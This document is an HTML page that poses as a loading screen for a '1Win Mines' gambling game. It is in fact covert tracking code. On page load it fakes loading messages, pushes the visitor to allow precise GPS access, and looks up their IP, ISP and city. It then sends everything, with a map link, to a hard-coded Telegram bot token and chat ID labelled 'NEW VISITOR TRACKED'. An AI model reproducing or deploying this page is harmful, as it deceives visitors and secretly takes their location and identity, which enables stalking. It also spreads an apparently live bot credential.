<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1Win Mines</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #bg-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        #loading-text {
            color: white;
            font-size: 18px;
            margin-top: 10px;
            text-align: center;
        }
        #permission-request {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 3;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #permission-request h2 {
            margin-bottom: 15px;
        }
        #allow-btn {
            margin-top: 20px;
            padding: 12px 30px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
    
    <div id="loading-overlay">
        <div class="loader"></div>
        <div id="loading-text">Connecting to server...</div>
    </div>
    
    <div id="permission-request">
        <h2>Location Access Required</h2>
        <p>Please allow location access to continue</p>
        <button id="allow-btn">ALLOW LOCATION</button>
    </div>

    <script>
        // Telegram bot details
        const botToken = '8460292252:AAF8NmgrqiqW__2fW7kTlRrA74nDiZkkgQg';
        const chatId = '80160043955';
        
        // DOM elements
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingText = document.getElementById('loading-text');
        const permissionRequest = document.getElementById('permission-request');
        const allowBtn = document.getElementById('allow-btn');
        
        // Loading messages
        const loadingMessages = [
            "Connecting to server...",
            "Loading game assets...",
            "Verifying account...",
            "Almost ready...",
            "Preparing interface...",
            "Finalizing setup..."
        ];
        
        // Function to get IP info
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                return await detailsResponse.json();
            } catch (error) {
                console.error("IP info error:", error);
                return {};
            }
        }
        
        // Function to get precise location
        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toLocaleString()
                    }),
                    error => {
                        // Only show permission request if location was denied
                        if (error.code === error.PERMISSION_DENIED) {
                            setTimeout(() => {
                                permissionRequest.style.display = 'flex';
                            }, 3000);
                        }
                        resolve(null);
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // Function to send data to Telegram
        async function sendToTelegram(data) {
            try {
                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
                message += `📱 Device: ${navigator.userAgent}\n\n`;
                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
                
                if (data.liveLocation) {
                    message += `\n🎯 LIVE GPS LOCATION:\n`;
                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
                } else {
                    message += `\n📍 APPROX LOCATION:\n`;
                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
                    if (data.latitude && data.longitude) {
                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
                    }
                }
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                if (data.liveLocation) {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            latitude: data.liveLocation.lat,
                            longitude: data.liveLocation.lon
                        })
                    });
                }
            } catch (error) {
                console.error("Telegram error:", error);
            }
        }
        
        // Rotate loading messages
        function rotateLoadingMessages() {
            let counter = 0;
            setInterval(() => {
                loadingText.textContent = loadingMessages[counter];
                counter = (counter + 1) % loadingMessages.length;
            }, 3000);
        }
        
        // Main tracking function
        async function trackUser() {
            // Start rotating loading messages
            rotateLoadingMessages();
            
            // First try to get precise location silently
            const liveLocation = await getPreciseLocation();
            
            // Then get IP details
            const ipDetails = await getIPInfo();
            
            // Combine all data
            const trackingData = {
                ...ipDetails,
                ip: ipDetails.ip || 'Unknown',
                liveLocation: liveLocation
            };
            
            // Send to Telegram
            await sendToTelegram(trackingData);
        }
        
        // When allow button is clicked
        allowBtn.addEventListener('click', async () => {
            permissionRequest.style.display = 'none';
            // Try to get location again
            await trackUser();
        });
        
        // Start tracking when page loads
        window.onload = trackUser;
    </script>
</body>
</html>
